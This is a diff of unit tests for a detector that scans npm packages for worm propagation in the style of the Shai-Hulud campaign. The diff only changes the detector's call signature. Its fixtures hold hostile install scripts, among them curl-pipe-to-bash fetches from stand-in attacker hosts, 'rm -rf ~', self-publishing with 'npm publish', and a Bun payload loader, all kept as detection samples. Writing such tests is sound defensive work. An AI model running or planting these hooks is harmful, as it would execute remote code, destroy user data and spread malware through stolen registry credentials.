@@ -23,7 +23,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
                     "postinstall": "curl http://shai-hulud.cc/payload.sh | bash"
                 }
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
             messages = [f.message for f in worm_findings]
@@ -43,7 +43,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
                     "postinstall": "npm whoami && npm publish --access public"
                 }
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
             messages = [f.message for f in worm_findings]
@@ -63,7 +63,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
                     "postinstall": "node -e 'var r=require(\"child_process\");r.execSync(\"curl http://evil.cc/p | bash\")'"
                 }
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
 
@@ -78,7 +78,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
                     "preinstall": "node bun_environment.js"
                 }
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
             bun_findings = [f for f in worm_findings if "Bun" in f.message or "bun" in f.message.lower()]
@@ -95,7 +95,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
                     "postinstall": "rm -rf ~"
                 }
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
             destructive = [f for f in worm_findings if "destructive" in f.message.lower() or "wipe" in f.message.lower()]
@@ -111,7 +111,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
             }, files={
                 "index.js": "// Campaign: MUT-8694\nconst x = 1;"
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
 
@@ -126,7 +126,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
                     "postinstall": "git config --unset core.bare"
                 }
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
 
@@ -142,7 +142,7 @@ class TestWormPropagationPostInstall(unittest.TestCase):
                     "test": "jest"
                 }
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertEqual(len(worm_findings), 0)
 
@@ -160,7 +160,7 @@ class TestWormPropagationSourceScan(unittest.TestCase):
             }, files={
                 "index.js": "const fs = require('fs'); fs.writeFileSync('package.json', data);"
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
 
@@ -174,7 +174,7 @@ class TestWormPropagationSourceScan(unittest.TestCase):
             }, files={
                 "propagate.js": "const glob = require('glob');\nglob.sync('node_modules/*/package.json');"
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
 
@@ -197,7 +197,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
                 "version": "0.0.1",
                 "scripts": {"prepare": "bun run router_init.js && exit 1"},
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             msgs = [f.message for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertTrue(any("Bun runtime execution" in m for m in msgs), msgs)
 
@@ -210,7 +210,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
                 "version": "1.0.0",
                 "scripts": {"preinstall": "bun run loader.js && exit 1"},
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             msgs = [f.message for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertTrue(any("Forced exit" in m for m in msgs), msgs)
 
@@ -224,7 +224,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
                 "optionalDependencies": {"x": "github:attacker/x#abc"},
                 "scripts": {"preinstall": "node setup.js"},
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             crit = [f for f in findings
                     if f.rule_id == "L2-WORM-001"
                     and f.severity.value == "CRITICAL"
@@ -247,7 +247,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
                     "fetch('https://otel.example/v1/traces', {method:'POST', body:blob});\n"
                 ),
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm), 0)
 
@@ -260,7 +260,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
                 "version": "1.0.0",
                 "dependencies": {"lib": "git+https://github.com/me/lib.git#v2"},
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             crit = [f for f in findings
                     if f.rule_id == "L2-WORM-001" and f.severity.value == "CRITICAL"]
             self.assertEqual(len(crit), 0, [f.message for f in findings])
@@ -274,7 +274,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
                 "version": "1.0.0",
                 "scripts": {"prepare": "husky install"},
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertEqual(len(worm), 0, [f.message for f in worm])
 
@@ -292,7 +292,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
                     'const p = Bun.spawnSync(["ls"]);\n'
                 ),
             })
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             worm = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertEqual(len(worm), 0, [f.message for f in worm])
 
@@ -303,7 +303,7 @@ class TestMiniShaiHuludTanStack(unittest.TestCase):
             _make_project(tmp_path, {
                 "name": "evil", "version": "1.0.0",
             }, files={"loader.js": "const blob = Bun.gunzipSync(payload);\n"})
-            findings = detect_worm_propagation(tmp_path, tmp_path / "corpus")
+            findings = detect_worm_propagation(tmp_path)
             msgs = [f.message for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertTrue(any("Bun-only runtime API" in m for m in msgs), msgs)
 
